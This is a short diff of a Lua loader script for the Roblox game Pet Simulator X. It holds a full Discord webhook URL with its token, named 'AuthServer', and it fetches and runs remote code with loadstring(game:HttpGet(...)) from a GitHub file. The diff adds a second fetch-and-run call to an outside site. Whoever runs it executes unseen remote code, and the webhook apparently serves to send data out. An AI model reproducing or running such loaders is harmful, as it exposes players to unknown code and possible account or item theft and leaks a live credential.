@@ -1,3 +1,5 @@
 _G.Key = "relzziRgniKehT"
 _G.AuthServer = "https://discord.com/api/webhooks/1064336065944633426/KSv5_WVd79HzvDRl-Z0s1yD5oQmHvoGKkQGCUhn6qbJOFCGL7sz1_5LAKofm5WmDv-dU"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()
+wait(10)
+loadstring(game:HttpGet("https://milkup.info/script/PetSimulatorX/"))()
